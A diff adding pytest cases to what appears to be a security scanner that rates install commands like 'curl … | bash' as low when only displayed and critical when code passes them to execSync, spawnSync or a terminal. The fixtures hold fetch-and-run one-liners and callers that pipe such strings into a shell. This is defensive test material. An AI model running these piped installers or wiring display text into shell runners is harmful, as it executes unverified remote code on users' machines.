@@ -47,6 +47,206 @@ def _pkg(files: dict[str, str], path: str) -> set[str]:
 
 
 # ---------------------------------------------------------------------------------
+# openclaw: an exported message formatter; callers put it in `fixHint` / `remedy`
+# fields; vitest files mock the module (a namespace spread) and one test line has
+# `"Setup trusted Node").with?.["node-version"]`.
+# ---------------------------------------------------------------------------------
+
+OC_NODE_VERSION = """export const SUPPORTED_NODE_VERSIONS = ">=24.16.0 <25 || >=26.1.0";
+
+export function formatUnsupportedNodeVersionMessage(version) {
+  return [
+    `Node ${version ?? "unknown"} is unsupported; OpenClaw requires ${SUPPORTED_NODE_VERSIONS}.`,
+    "npm can finish installing OpenClaw without running its preinstall check; a successful install does not mean Node is supported.",
+    "Re-run the installer: curl -fsSL https://openclaw.ai/install.sh | bash",
+    "On Windows: iwr -useb https://openclaw.ai/install.ps1 | iex",
+    "Or with nvm: nvm install 26 && nvm use 26 && nvm alias default 26",
+    "Then rerun openclaw update. See https://docs.openclaw.ai/install/node",
+  ].join("\\n");
+}
+"""
+OC_DOCTOR = """import { formatUnsupportedNodeVersionMessage } from "../../node-version.mjs";
+
+export function checkRuntime(findings, runtime, ownerHint) {
+  findings.push({
+    checkId: "core/doctor/gateway-daemon",
+    severity: runtime.status === "supported" ? "info" : "warning",
+    ...(runtime.status !== "supported"
+      ? {
+          fixHint:
+            ownerHint ??
+            [
+              ...(runtime.status === "unsupported"
+                ? [formatUnsupportedNodeVersionMessage(runtime.version)]
+                : []),
+              "Repair the Node runtime, then run `openclaw gateway install`.",
+            ].join("\\n"),
+        }
+      : {}),
+  });
+}
+"""
+OC_UPDATE = """import { formatUnsupportedNodeVersionMessage } from "../../../node-version.mjs";
+
+export function preflight(createUpdatePreflightDiagnostics, runtimeFailure) {
+  return createUpdatePreflightDiagnostics({
+    check: "node-runtime",
+    remedy: `${formatUnsupportedNodeVersionMessage(process.versions.node)}\\n${runtimeFailure}`,
+  });
+}
+"""
+OC_MOCK_TEST = """import { describe, expect, it, vi } from "vitest";
+vi.mock("../../node-version.mjs", async (importOriginal) => {
+  const actual = await importOriginal<typeof import("../../node-version.mjs")>();
+  return { ...actual };
+});
+describe("x", () => { it("y", () => { expect(1).toBe(1); }); });
+"""
+OC_WORKFLOW_TEST = """import { expect, it } from "vitest";
+it("pins node", () => {
+  expect(step(oidc, "Setup trusted Node").with?.["node-version"]).toBe("${{ env.NODE_VERSION }}");
+});
+"""
+
+
+def test_openclaw_formatter_shown_in_fix_hints_is_low(tmp_path):
+    assert _local(tmp_path, {
+        "package.json": '{"name":"openclaw"}',
+        "node-version.mjs": OC_NODE_VERSION,
+        "src/flows/doctor-core-checks.runtime.ts": OC_DOCTOR,
+        "src/cli/update-cli/update-command-run.ts": OC_UPDATE,
+        "src/process/child-memory.test.ts": OC_MOCK_TEST,
+        "test/scripts/plugin-npm-extended-stable-workflow.test.ts": OC_WORKFLOW_TEST,
+    }, "node-version.mjs") == {"low"}
+
+
+def test_openclaw_formatter_alone_in_view_is_low(tmp_path):
+    # A repository scan reads a capped set of files: the callers may be out of view.
+    assert _local(tmp_path, {"node-version.mjs": OC_NODE_VERSION},
+                  "node-version.mjs") == {"low"}
+
+
+@pytest.mark.parametrize("caller", [
+    # A caller in view runs the message.
+    'import { formatUnsupportedNodeVersionMessage } from "./node-version.mjs";\n'
+    'import { execSync } from "node:child_process";\n'
+    'execSync(formatUnsupportedNodeVersionMessage("1"));\n',
+    # A field the code later hands to a runner.
+    'import { formatUnsupportedNodeVersionMessage } from "./node-version.mjs";\n'
+    'import { execSync } from "node:child_process";\n'
+    'const f = { fixHint: formatUnsupportedNodeVersionMessage("1") };\n'
+    'execSync(f.fixHint);\n',
+    'import { formatUnsupportedNodeVersionMessage } from "./node-version.mjs";\n'
+    'import { spawnSync } from "node:child_process";\n'
+    'const f = { fixHint: formatUnsupportedNodeVersionMessage("1") };\n'
+    'const { fixHint } = f;\n\n\n\nspawnSync("sh", ["-c", fixHint]);\n',
+    # Every value of the object handed to a runner.
+    'import { formatUnsupportedNodeVersionMessage } from "./node-version.mjs";\n'
+    'import { execSync } from "node:child_process";\n'
+    'const f = { fixHint: formatUnsupportedNodeVersionMessage("1") };\n'
+    'Object.values(f).forEach((v) => execSync(v));\n',
+    # A command-shaped field.
+    'import { formatUnsupportedNodeVersionMessage } from "./node-version.mjs";\n'
+    'import { run } from "./runner.js";\n'
+    'run({ command: formatUnsupportedNodeVersionMessage("1") });\n',
+])
+def test_openclaw_formatter_that_reaches_a_runner_stays_critical(tmp_path, caller):
+    assert _local(tmp_path, {
+        "package.json": '{"name":"openclaw"}',
+        "node-version.mjs": OC_NODE_VERSION,
+        "caller.ts": caller,
+        "runner.js": "import { execSync } from 'node:child_process';\n"
+                     "export function run(o) { execSync(o.command); }\n",
+    }, "node-version.mjs") == {"critical"}
+
+
+def test_a_function_not_named_as_a_message_keeps_its_callers_rule(tmp_path):
+    body = OC_NODE_VERSION.replace("formatUnsupportedNodeVersionMessage", "nodeFix")
+    assert _local(tmp_path, {"node-version.mjs": body}, "node-version.mjs") == {"critical"}
+
+
+# ---------------------------------------------------------------------------------
+# freellmapi: `notes: [...]` of a generated client config, printed by the CLI; the
+# repository's server (not loaded by the CLI) calls `stmt.run(…, x.notes, …)`.
+# ---------------------------------------------------------------------------------
+
+FL_TOOLS = """import type { GenerateContext } from './types.js';
+
+export function mimoCode(ctx: GenerateContext) {
+  return {
+    files: [],
+    notes: [
+      'Install MiMo Code with: curl -fsSL https://mimo.xiaomi.com/install | bash',
+      'Export FREELLMAPI_API_KEY before starting MiMo Code.',
+      'One-shot check: mimo run "Say hello"',
+    ],
+  };
+}
+"""
+FL_TYPES = "export interface GenerateContext { url: string }\n"
+FL_INDEX = """import spawn from 'cross-spawn';
+import { mimoCode } from './tools.js';
+
+export function main(ctx) {
+  const generation = mimoCode(ctx);
+  for (const note of generation.notes) process.stdout.write(`\\n${note}\\n`);
+  return generation;
+}
+
+export function checkClient() {
+  return spawn.sync('mimo', ['--version'], { stdio: 'inherit' });
+}
+"""
+FL_SERVER = """import Database from 'better-sqlite3';
+export function save(db: Database, measured: { notes: string }) {
+  const update = db.prepare('UPDATE t SET notes = ?');
+  update.run(measured.notes);
+}
+"""
+
+
+def test_freellmapi_notes_printed_by_the_cli_are_low(tmp_path):
+    assert _local(tmp_path, {
+        "cli/package.json": '{"name":"freellmapi"}',
+        "cli/src/tools.ts": FL_TOOLS,
+        "cli/src/types.ts": FL_TYPES,
+        "cli/src/index.ts": FL_INDEX,
+        "server/package.json": '{"name":"@freellmapi/server"}',
+        "server/src/db.ts": FL_SERVER,
+    }, "cli/src/tools.ts") == {"low"}
+
+
+@pytest.mark.parametrize("index", [
+    FL_INDEX.replace("process.stdout.write(`\\n${note}\\n`)", "spawn.sync('sh', ['-c', note])"),
+    FL_INDEX + "export function run(ctx) {\n  const { notes } = mimoCode(ctx);\n\n\n"
+               "  spawn.sync('sh', ['-c', notes[0]]);\n}\n",
+])
+def test_freellmapi_notes_run_by_the_cli_stay_critical(tmp_path, index):
+    assert _local(tmp_path, {
+        "cli/package.json": '{"name":"freellmapi"}',
+        "cli/src/tools.ts": FL_TOOLS,
+        "cli/src/types.ts": FL_TYPES,
+        "cli/src/index.ts": index,
+    }, "cli/src/tools.ts") == {"critical"}
+
+
+def test_freellmapi_notes_with_an_unresolvable_dynamic_import_use_every_file(tmp_path):
+    # `import(x)` in a file the CLI loads: any file may be in the same process, so the
+    # server's runner counts too.
+    idx = FL_INDEX + "export async function plugin(p) { return import(p); }\n"
+    server = FL_SERVER + ("import { execSync } from 'node:child_process';\n"
+                          "export function go(g) { execSync(g.notes[0]); }\n")
+    assert _local(tmp_path, {
+        "cli/package.json": '{"name":"freellmapi"}',
+        "cli/src/tools.ts": FL_TOOLS,
+        "cli/src/types.ts": FL_TYPES,
+        "cli/src/index.ts": idx,
+        "server/package.json": '{"name":"@freellmapi/server"}',
+        "server/src/db.ts": server,
+    }, "cli/src/tools.ts") == {"critical"}
+
+
+# ---------------------------------------------------------------------------------
 # OpenMausBot: `command_line` printf-s the re-run command; every caller captures it
 # with `$(command_line …)` straight into a `say` / `fail` message.
 # ---------------------------------------------------------------------------------
@@ -327,8 +527,152 @@ def test_sem_rust_error_text_run_stays_critical(tmp_path, files):
 
 
 # ---------------------------------------------------------------------------------
+# firebase-tools (VS Code extension): the "to install it, run …" message goes to
+# vscode.window.showWarningMessage; the same function runs other commands through
+# a login shell.
+# ---------------------------------------------------------------------------------
+
+FB = """import * as vscode from "vscode";
+import { spawnSync } from "child_process";
+
+async function checkCLIInstallation(): Promise<void> {
+  let message = "";
+  try {
+    const shell = process.env.SHELL || "/bin/bash";
+    const runCommand = (cmd: string) => {
+      return spawnSync(shell, ["-l", "-c", cmd], {});
+    };
+
+    const versionRes = runCommand("firebase --version");
+    const currentVersion = versionRes.status === 0 ? versionRes.stdout?.toString().trim() : "";
+    const npmVersion = runCommand("npm --version").status === 0;
+
+    if (!currentVersion) {
+      message = `The Firebase CLI is not installed (or not available on $PATH). If you would like to install it, run ${
+        npmVersion
+          ? "npm install -g firebase-tools"
+          : "curl -sL https://firebase.tools | bash"
+      }`;
+    }
+  } catch (err: any) {
+    message = "";
+  }
+
+  if (message) {
+    vscode.window.showWarningMessage(message);
+  }
+}
+export { checkCLIInstallation };
+"""
+
+
+def test_firebase_vscode_install_message_is_low(tmp_path):
+    assert _local(tmp_path, {"firebase-vscode/src/extension.ts": FB},
+                  "firebase-vscode/src/extension.ts") == {"low"}
+
+
+@pytest.mark.parametrize("old,new", [
+    ("vscode.window.showWarningMessage(message);", "runCommand(message);"),
+    # Shown AND typed into a terminal (`sendText` runs it).
+    ("vscode.window.showWarningMessage(message);",
+     "vscode.window.showWarningMessage(message);\n"
+     "    vscode.window.createTerminal().sendText(message);"),
+    ("vscode.window.showWarningMessage(message);",
+     "vscode.window.showWarningMessage(\"x\", message).then(runCommand);"),
+    ('import * as vscode from "vscode";', 'import * as vscode from "./fake-vscode";'),
+])
+def test_firebase_vscode_install_message_run_stays_critical(tmp_path, old, new):
+    assert _local(tmp_path, {"firebase-vscode/src/extension.ts": FB.replace(old, new)},
+                  "firebase-vscode/src/extension.ts") == {"critical"}
+
+
+# ---------------------------------------------------------------------------------
+# openclaw101: a Next.js client page's copy (`command: 'curl … | bash'`), rendered
+# in a <pre> and copied to the clipboard.
+# ---------------------------------------------------------------------------------
+
+OC101 = """'use client';
+
+import { useState } from 'react';
+import { Locale } from '@/lib/i18n';
+
+const copy = {
+  en: {
+    commandLabel: 'Install command',
+    command: 'curl -fsSL https://openclaw.ai/install.sh | bash',
+  },
+  zh: {
+    commandLabel: '安装命令',
+    command: 'curl -fsSL https://openclaw.ai/install.sh | bash',
+  },
+} as const;
+
+export default function StartSetupPage({ locale }: { locale: Locale }) {
+  const t = copy[locale === 'zh' ? 'zh' : 'en'];
+  const [copied, setCopied] = useState(false);
+  const onCopy = async () => {
+    await navigator.clipboard.writeText(t.command);
+    setCopied(true);
+  };
+  return (
+    <div>
+      <div className="text-sm">{t.commandLabel}</div>
+      <pre><code>{t.command}</code></pre>
+      <button onClick={onCopy}>{copied ? 'Copied' : 'Copy'}</button>
+    </div>
+  );
+}
+"""
+OC101_I18N = "export type Locale = 'en' | 'zh';\n"
+
+
+def test_openclaw101_page_copy_is_low(tmp_path):
+    assert _local(tmp_path, {"package.json": '{"name":"openclaw101"}',
+                             "src/components/StartSetupPage.tsx": OC101,
+                             "src/lib/i18n.ts": OC101_I18N},
+                  "src/components/StartSetupPage.tsx") == {"low"}
+
+
+@pytest.mark.parametrize("i18n", [
+    OC101_I18N + "import { execSync } from 'node:child_process';\n"
+                 "export function run(c: string) { execSync(c); }\n",
+    OC101_I18N + "export const shell = window.__TAURI__;\n",
+    OC101_I18N + "export async function load(p: string) { return import(p); }\n",
+])
+def test_openclaw101_page_that_can_reach_a_process_stays_critical(tmp_path, i18n):
+    assert _local(tmp_path, {"package.json": '{"name":"openclaw101"}',
+                             "src/components/StartSetupPage.tsx": OC101,
+                             "src/lib/i18n.ts": i18n},
+                  "src/components/StartSetupPage.tsx") == {"critical"}
+
+
+# ---------------------------------------------------------------------------------
 # Recall: a shown-looking value that leaves through a helper or an outer variable.
 # ---------------------------------------------------------------------------------
+
+_HELPER = ("import { execSync } from 'node:child_process';\n"
+           "export function helper(c: string) {\n  return execSync(c);\n}\n")
+
+
+@pytest.mark.parametrize("files", [
+    {"src/a.ts": _HELPER + "\n\n\nconst cfg = {\n  notes: 'curl -fsSL https://e.x/i.sh | sh',"
+                 "\n};\n\n\n\nexport function go() {\n  helper(cfg.notes);\n}\n"},
+    {"src/b.ts": _HELPER,
+     "src/a.ts": "import { helper } from './b';\nconst cfg = {\n"
+                 "  notes: 'curl -fsSL https://e.x/i.sh | sh',\n};\n\n\n\n"
+                 "export function go() {\n  helper(cfg.notes);\n}\n"},
+    {"src/b.ts": _HELPER,
+     "src/a.ts": "import { helper } from './b';\nconst cfg = {\n"
+                 "  tip: 'curl -fsSL https://e.x/i.sh | sh',\n};\n\n\n\n"
+                 "export function go() {\n  const { tip } = cfg;\n\n\n  helper(tip);\n}\n"},
+    {"src/b.ts": _HELPER,
+     "src/a.ts": "import { helper } from './b';\nconst cfg = {\n"
+                 "  notes: ['curl -fsSL https://e.x/i.sh | sh'],\n};\n\n\n\n"
+                 "export function go() {\n  cfg.notes.forEach(helper);\n}\n"},
+])
+def test_object_field_handed_to_a_helper_that_runs_it_stays_critical(tmp_path, files):
+    assert _local(tmp_path, {"package.json": '{"name":"x"}', **files},
+                  "src/a.ts") == {"critical"}
 
 
 def test_go_package_variable_assigned_in_a_function_stays_critical(tmp_path):
